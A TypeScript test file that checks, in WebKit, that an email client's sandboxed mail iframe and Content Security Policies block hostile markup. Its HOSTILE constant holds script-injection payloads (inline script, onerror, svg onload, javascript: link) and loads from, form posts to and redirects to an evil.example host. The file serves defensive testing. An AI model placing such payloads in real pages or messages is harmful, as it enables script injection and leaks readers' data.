// The mail frame under the real page policies, in WebKit (campbooks-cloud#199):
// the desktop app's (`src-tauri/tauri.conf.json`) and the web app's
// (`crates/server/src/web.rs`), read from where they are defined so this test
// follows any change to them. The frame is the one the app renders
// (`lib/ui/safe-html/frame.ts`), around the server's own output for the #160
// fixtures (`fixtures/*.html`, kept in step by a Rust test) and around hostile
// markup no sanitiser would let through, to prove the policy and the sandbox
// hold on their own.
//
//   pnpm --filter @campbooks/app exec playwright install webkit
//   pnpm --filter @campbooks/app test:csp
import { Buffer } from "node:buffer";
import { readFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { webkit, type Browser, type Page } from "playwright";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import {
  frameDocument,
  framePolicy,
  REFERRER_POLICY,
  SANDBOX,
} from "../../src/lib/ui/safe-html/frame.ts";

const here = path.dirname(fileURLToPath(import.meta.url));
const read = (file: string) => readFileSync(path.join(here, file), "utf8");

/** The desktop app's production policy (Tauri adds hashes for its own scripts only). */
function desktopPolicy(): string {
  const config = JSON.parse(read("../../src-tauri/tauri.conf.json")) as {
    app: { security: { csp: string } };
  };
  return config.app.security.csp;
}

/** The web app's policy, as the server sends it (`CONTENT_SECURITY_POLICY`). */
function webPolicy(): string {
  const source = read("../../../../crates/server/src/web.rs");
  const found = /CONTENT_SECURITY_POLICY: &str = "([\s\S]*?)";/u.exec(source)?.[1];
  if (found === undefined) {
    throw new Error("CONTENT_SECURITY_POLICY not found in web.rs");
  }
  // A Rust string continued with `\` drops the line break and the indent.
  return found.replaceAll(/\\\r?\n\s*/gu, "");
}

/** A 1×1 PNG, served for every remote image the page lets through. */
const PNG = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
  "base64",
);

/**
 * Markup the server's sanitiser removes, kept here on purpose: the frame's
 * policy and sandbox must hold even if it ever let some through.
 */
const HOSTILE = `
<p data-probe style="color: rgb(200, 0, 0); font-weight: 700">Styled by its own attribute</p>
<img data-own src="data:image/png;base64,${PNG.toString("base64")}" width="20" height="20" alt="">
<img src="https://images.example/banner.png" width="40" height="20" alt="banner">
<img src="http://images.example/plain.png" width="40" height="20" alt="plain http">
<div style="background-image: url(https://images.example/attribute-bg.png); width: 10px; height: 10px"></div>
<style>@import url("https://evil.example/import.css"); p { background: url("https://evil.example/style-bg.png") }</style>
<link rel="stylesheet" href="https://evil.example/link.css">
<script>parent.pwned = "script";</script>
<img src="data:," onerror="parent.pwned = 'onerror'" alt="">
<svg onload="parent.pwned = 'svg'"><rect width="1" height="1"></rect></svg>
<a id="script-link" href="javascript:parent.pwned='href'">a script link</a>
<form action="https://evil.example/collect" method="post"><input name="q" value="x"><button id="send">Send</button></form>
<a id="navigate" href="https://evil.example/navigate" target="_self">navigate the frame</a>
<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">
`;

/** How a test frames the mail: as the app does, unless a control says otherwise. */
interface Framing {
  /** The frame's sandbox (the app's, `SANDBOX`). */
  sandbox: string;
  /** Whether the frame's document carries its own policy (it does in the app). */
  framePolicy: boolean;
}

const AS_THE_APP: Framing = { sandbox: SANDBOX, framePolicy: true };

/** The page a test opens: the frame, as the app renders it, and nothing else. */
function harness(html: string, remoteImages: boolean, framing: Framing): string {
  const document = frameDocument(html, remoteImages);
  const shown = framing.framePolicy
    ? document
    : document.replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/u, "");
  const srcdoc = shown.replaceAll("&", "&amp;").replaceAll('"', "&quot;");
  return `<!doctype html><html><head><meta charset="utf-8"><title>Mail frame</title></head><body style="margin: 0"><iframe id="mail" title="Message" sandbox="${framing.sandbox}" referrerpolicy="${REFERRER_POLICY}" style="width: 720px; height: 1600px; border: 0" srcdoc="${srcdoc}"></iframe></body></html>`;
}

let browser: Browser;
let server: Server;
let origin: string;
/** What each path serves, and the policy it is served under. */
const pages = new Map<string, { html: string; csp: string }>();

beforeAll(async () => {
  browser = await webkit.launch();
  server = createServer((request, response) => {
    const served = pages.get(request.url ?? "");
    if (served === undefined) {
      response.writeHead(404).end();
      return;
    }
    // No policy at all for a control that asks for none ("").
    response
      .writeHead(200, {
        "content-type": "text/html; charset=utf-8",
        ...(served.csp === "" ? {} : { "content-security-policy": served.csp }),
      })
      .end(served.html);
  });
  await new Promise<void>((resolve) => {
    server.listen(0, "127.0.0.1", resolve);
  });
  origin = `http://127.0.0.1:${String((server.address() as AddressInfo).port)}`;
}, 60_000);

afterAll(async () => {
  await browser.close();
  await new Promise((resolve) => server.close(resolve));
});

interface Opened {
  page: Page;
  /** Every URL requested other than the page itself. */
  requested: string[];
  /** Pages the frame opened (popups). */
  popups: Page[];
}

let opened = 0;

/** Open `html` in the frame under `csp`, remote images allowed or not. */
async function open(
  csp: string,
  html: string,
  remoteImages: boolean,
  framing: Framing = AS_THE_APP,
): Promise<Opened> {
  opened += 1;
  const at = `/mail-${String(opened)}`;
  pages.set(at, { html: harness(html, remoteImages, framing), csp });
  const context = await browser.newContext();
  const requested: string[] = [];
  const popups: Page[] = [];
  context.on("page", (popup) => {
    popups.push(popup);
  });
  // Every page of the context, popups included.
  context.on("request", (request) => {
    if (!request.url().startsWith(origin)) {
      requested.push(request.url());
    }
  });
  // Remote hosts answer from here: nothing leaves the machine, and every
  // request the page lets through is seen.
  await context.route(/^https?:\/\/(?!127\.0\.0\.1)/u, (route) =>
    route.fulfill({ status: 200, contentType: "image/png", body: PNG }),
  );
  const page = await context.newPage();
  await page.goto(`${origin}${at}`);
  await page.waitForLoadState("load");
  // Late loads (a refresh, a lazy image) get their chance.
  await page.waitForTimeout(1500);
  return { page, requested, popups };
}

/**
 * Evaluate `expression` against the frame's document (`doc`), from the page
 * (same origin), as the app reads it. A script string: this file is
 * type-checked without the DOM types, like the recordings.
 */
function inFrame(page: Page, expression: string): Promise<unknown> {
  return page.evaluate(
    `(() => { const doc = document.getElementById("mail").contentDocument; return ${expression}; })()`,
  );
}

/** The remote images a sanitised body names: what Show images may load, and nothing else. */
function remoteImages(html: string): string[] {
  return [
    ...new Set([...html.matchAll(/src="(https:\/\/[^"]+)"/gu)].map((match) => match[1] ?? "")),
  ];
}

describe("the frame's own layers", () => {
  it("never lets the mail run, post or navigate the app", () => {
    const flags = SANDBOX.split(" ");
    expect(flags).not.toContain("allow-scripts");
    expect(flags).not.toContain("allow-forms");
    expect(flags.filter((flag) => flag.startsWith("allow-top-navigation"))).toEqual([]);
  });

  it("would see a script run: the probe works (a control, never the app's frame)", async () => {
    // The same harness and mail with `allow-scripts`, no page policy and no
    // frame policy: the hostile markup's scripts run and set the flag the
    // "runs no script" tests look for, so their silence means something.
    const { page } = await open("", HOSTILE, true, {
      sandbox: `${SANDBOX} allow-scripts`,
      framePolicy: false,
    });
    await page.frameLocator("#mail").locator("#script-link").click();
    await page.waitForTimeout(800);
    expect(await page.evaluate("window.pwned")).toEqual(expect.any(String));
    await page.context().close();
  });

  it("allows nothing but data: images until Show images", () => {
    expect(framePolicy(false).startsWith("default-src 'none'")).toBe(true);
    expect(framePolicy(false)).toContain("img-src data:;");
    expect(framePolicy(true)).not.toMatch(/script-src|connect-src|frame-src/u);
  });
});

const POLICIES = [
  ["desktop", desktopPolicy()],
  ["web", webPolicy()],
] as const;

describe.each(POLICIES)("the mail frame under the %s policy", (_name, csp) => {
  it("keeps inline style attributes and its own data: images", async () => {
    const { page } = await open(csp, HOSTILE, false);
    expect(await inFrame(page, `getComputedStyle(doc.querySelector("[data-probe]")).color`)).toBe(
      "rgb(200, 0, 0)",
    );
    expect(await inFrame(page, `doc.querySelector("img[data-own]").naturalWidth`)).toBe(1);
    await page.context().close();
  });

  it("loads nothing remote before Show images, style sheets and refreshes included", async () => {
    const { page, requested } = await open(csp, HOSTILE, false);
    expect(requested).toEqual([]);
    await page.context().close();
  });

  it("loads https images after Show images, never style sheets or plain http", async () => {
    const { page, requested } = await open(csp, HOSTILE, true);
    expect(requested).toContain("https://images.example/banner.png");
    expect(requested).toContain("https://images.example/attribute-bg.png");
    expect(requested.filter((url) => url.startsWith("http:"))).toEqual([]);
    expect(requested.filter((url) => url.includes("evil.example"))).toEqual([]);
    await page.context().close();
  });

  it("runs no script: no <script>, onerror, <svg onload> or javascript: link", async () => {
    const { page, popups } = await open(csp, HOSTILE, true);
    await page.frameLocator("#mail").locator("#script-link").click();
    await page.waitForTimeout(800);
    expect(await page.evaluate("window.pwned")).toBeUndefined();
    // A popup the link may have opened ran nothing either (one already gone
    // ran nothing that stayed).
    for (const popup of popups) {
      const pwned: unknown = await popup.evaluate("window.pwned").catch(() => null);
      expect([undefined, null]).toContain(pwned);
    }
    await page.context().close();
  });

  it("posts no form, and neither a link nor a refresh navigates the frame", async () => {
    const { page, requested } = await open(csp, HOSTILE, true);
    const frame = page.frameLocator("#mail");
    await frame.locator("#send").click();
    await frame.locator("#navigate").click();
    await page.waitForTimeout(1500);
    expect(requested.filter((url) => url.includes("evil.example"))).toEqual([]);
    expect(await page.evaluate(`document.getElementById("mail").contentWindow.location.href`)).toBe(
      "about:srcdoc",
    );
    await page.context().close();
  });

  describe.each(["newsletter", "marketing-600", "outlook", "hostile"])(
    "the %s fixture",
    (fixture) => {
      it("renders styled with its images held back", async () => {
        const { page, requested } = await open(csp, read(`fixtures/${fixture}.held.html`), false);
        expect(requested).toEqual([]);
        // The server writes every style as an attribute: they apply (one the
        // policy blocked would leave its element's style empty).
        expect(
          await inFrame(
            page,
            `[...doc.body.querySelectorAll("[style]")].filter((e) => e.style.length > 0).length`,
          ),
        ).toBeGreaterThan(0);
        await page.context().close();
      });

      it("shows exactly its images once asked or trusted", async () => {
        const html = read(`fixtures/${fixture}.shown.html`);
        const { page, requested } = await open(csp, html, true);
        expect([...new Set(requested)].toSorted()).toEqual(remoteImages(html).toSorted());
        await page.context().close();
      });
    },
  );

  it("shows a trusted sender's images (#200): the real ones only, no pixel", async () => {
    // The server drops tracking pixels before the frame sees the body: the
    // hostile mail's three pixels are gone, its real logo loads.
    const { page, requested } = await open(csp, read("fixtures/hostile.shown.html"), true);
    expect([...new Set(requested)]).toEqual(["https://cdn.example/real-logo.png"]);
    await page.context().close();
  });

  it("loads nothing from the mail's @media rules before Show images", async () => {
    const { page, requested } = await open(csp, HOSTILE, false);
    // As the reader adopts the server's filtered rules: a constructed sheet,
    // which style-src does not govern; img-src still does.
    await page.evaluate(`(() => {
      const frame = document.getElementById("mail");
      const sheet = new frame.contentWindow.CSSStyleSheet();
      sheet.replaceSync("@media all { body { background-image: url(https://evil.example/adopted.png) } }");
      frame.contentDocument.adoptedStyleSheets = [sheet];
    })()`);
    await page.waitForTimeout(800);
    expect(requested).toEqual([]);
    await page.context().close();
  });
});
